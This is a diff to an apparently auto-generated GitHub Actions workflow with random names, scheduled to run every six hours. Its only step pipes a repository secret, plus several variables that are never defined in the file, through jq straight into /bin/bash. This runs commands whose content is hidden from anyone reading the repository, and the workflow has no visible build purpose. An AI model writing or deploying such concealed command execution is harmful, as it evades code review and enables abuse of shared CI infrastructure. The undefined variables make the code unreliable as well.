@@ -1,8 +1,10 @@
 name: bishasx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 4/6 * * *'
+    - cron: '34 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +12,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: bishasx
         env:
-          kkx08: ${{ secrets.kkx08 }}
+          gds314: ${{ secrets.gds314 }}
         run: |
-          echo $kkx08 | jq -r .wnrde64652 | /bin/bash
-          echo $vps31775 | jq -r .zgh83 | /bin/bash
-          echo $ptrei6 | jq -r .ssqy5498 | /bin/bash
-          echo $kls780 | jq -r .cl35 | /bin/bash
-          echo $xjnn27 | jq -r .avra01 | /bin/bash
-          echo $nw37548 | jq -r .l4796 | /bin/bash
-          echo $dxbq55 | jq -r .j23978 | /bin/bash
-          echo $juck94129 | jq -r .lzc5 | /bin/bash
-          echo $gaq7 | jq -r .niec8760 | /bin/bash
+          echo $gds314 | jq -r .f8 | /bin/bash
+          echo $ngtfq2120 | jq -r .fehqs070 | /bin/bash
+          echo $aaoa2453 | jq -r .hixrc3 | /bin/bash
+          echo $obdgs954 | jq -r .kor7 | /bin/bash
+          echo $vld21249 | jq -r .axy5 | /bin/bash
+          echo $yd6951 | jq -r .ehzj107 | /bin/bash
+          echo $zi6 | jq -r .xo3721 | /bin/bash
+          echo $dqm243 | jq -r .ag1855 | /bin/bash
+          echo $hmua4379 | jq -r .uwo7 | /bin/bash
+          echo $z8 | jq -r .rmov2215 | /bin/bash
+          echo $iow7 | jq -r .iw56501 | /bin/bash
 
